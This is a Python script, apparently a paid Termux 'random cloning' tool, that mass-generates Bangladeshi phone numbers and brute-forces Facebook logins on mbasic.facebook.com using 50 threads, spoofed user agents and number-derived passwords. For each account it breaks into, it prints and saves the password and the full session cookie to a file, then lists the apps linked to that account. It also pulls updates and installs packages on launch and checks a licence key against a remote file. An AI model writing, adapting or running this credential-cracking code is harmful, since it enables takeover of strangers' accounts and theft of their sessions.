#IT'S SAJJAD
#SCRIPT
 
 
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def main():
    os.system('clear')
    jalan(logo)
    print('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m RANDOM NUMBER CRACK [BD]')
    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')
    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mCHOOSE : ')
    if opt == '1':
        FIRE()
    if opt == '2':
        os.system(f'xdg-open https://www.facebook.com/profile.php?id=100058193053779&mibextid=ZbWKwL')
        return opt
    if opt == '3':
        os.system('Exit')
        return None
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  YOUR ACTIVE APPS     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100032901442053', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
update = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = "KHALID=="+id+bxd+xp
myweb2 = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
logo = ("""
\033[0;95m██ ████████ ███████          ██ ██ ███████  █████  ███    ██ 
\033[0;95m██    ██       ███           ██ ██ ██      ██   ██ ████   ██ 
\033[0;95m██    ██      ███            ██ ██ ███████ ███████ ██ ██  ██ 
\033[0;93m██    ██     ███        ██   ██ ██      ██ ██   ██ ██  ██ ██ 
\033[0;93m██    ██    ███████      █████  ██ ███████ ██   ██ ██   ████ 
                                                                                                                         
 
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] Admin By      :        IT'S SAJJAD      \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        Säjjädül Hâqûe Sãní(Töxîc)  \x1b[1;94m
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] TOOLS          :        RANDOM  CLONING             \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] STATUS         :        FREE                     \x1b[1;94m
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        0.1                   \x1b[1;94m
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
 
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        os.system('')
                        os.system('')
                        os.system('')
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        main()
                else:
                        os.system("clear");print(logo)
                        print(f"Your Device License Key Is Not Approved")
                        print(50*"-")
                        print(f"Key : {bumper}")
                        print(50*"-")
                        print(f" 15-Days Price : 350")
                        print(f" 1-Month Price : 500")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+8801814649133?text={bumper}")
                        qsbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')
 
def rrrr():
        if bumper in myweb2:
                pass
        else:
                qsbuy()
def xchker():
    pass
    qsbuy()
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""\033[92;1m
\033[0;95m██╗████████╗███████╗    ███████╗ █████╗      ██╗     ██╗ █████╗ ██████╗ 
\033[0;95m██║╚══██╔══╝██╔════╝    ██╔════╝██╔══██╗     ██║     ██║██╔══██╗██╔══██╗
\033[0;95m██║   ██║   ███████╗    ███████╗███████║     ██║     ██║███████║██║  ██║
\033[0;93m██║   ██║   ╚════██║    ╚════██║██╔══██║██   ██║██   ██║██╔══██║██║  ██║
\033[0;93m██║   ██║   ███████║    ███████║██║  ██║╚█████╔╝╚█████╔╝██║  ██║██████╔╝
\033[0;93m╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                                         
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] Admin By      :    IT'S SAJJAD      \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK   :    Säjjädül Hâqûe Sãní(Töxîc)  \x1b[1;94m
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] TOOLS          :    RANDOM  CLONING             \x1b[1;94m
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] STATUS        :    FREE                     \x1b[1;94m
\033[1;32m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION      :    0.1                   \x1b[1;94m
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
 
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        os.system(f'xdg-open https://www.facebook.com/groups/itz.SÄJJÄD.termux.zone/')
        print(f"");time.sleep(2)
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
ugen=[ ]
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14','15'])
    c='HUAWEI-P60 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
    ugen.append(ug)
    
# APK CHECK


def FIRE():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    xd="\033[1;92m="
    print(xd*55)
    print(f' [{xr}✔{xr}] Example>: {x}019,017,018,92302,92301,91778{x}')
    print(xd*55)
    rk1 = '0177'
    rk2 = '0176'
    rk3 = '0179'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}✔{x}]\033[0;92m EXAMPLE : \x1b[1;91m10000, \x1b[38;5;208m20000, \033[0;92m50000 \n\033[1;92m══════════════════════════════════════════════════════ \n\033[0;97m[{xr}✔{x}] \033[0;92mENTER CLONING LIMIT:\033[0;93m '))
    os.system("clear")
 
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    bal = input("ENTER YOUR NAME : ")
    
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(xd*55)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;92m'+code)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS    : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        print(xd*55)
        os.system(f'xdg-open https://facebook.com/groups/728950645469418/')
        print(f"");time.sleep(2)
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'mbasic.facebook.com',
    "method": 'GET',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    "accept-encoding": 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfdPKdm-f2WIBJt-nBVQY6e4HP4BysUYqpcwcpRX-ACNsDxYh8-h8sLirhtMlst4vndiUJfgU_mR-NYHmeZTFLpr7jEyCTobo5hJDVFbQTklsQ&smuh=8552&lh=Ac_e9VofirXup-ZRvOk&wtsid=rdr_0lI3QHxpv8CFzjdqW&refid=8&ref_component=mbasic_footer&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                idf = re.findall('c_user=(.*);xs', coki)[0]
                bal=tahunng(idf)
                print('\r\r\033[1;32m[SÄJJÄD-OK[🏵️]  ' +uid+ ' | ' +ps+ '\033[1;91m <==>' +bal+    '  \n\033[1;32m[‎‎🍪]\033[1;32mCOOKIE = \033[1;36m'+coki+  ' \n\033[1;36m[📲]AGENT =\033[1;32m'+pro+'  \033[1;32m')
                cek_apk(session,coki)
                open('/sdcard/SÄJJÄD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}SÄJJÄD[💥]{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
main()
 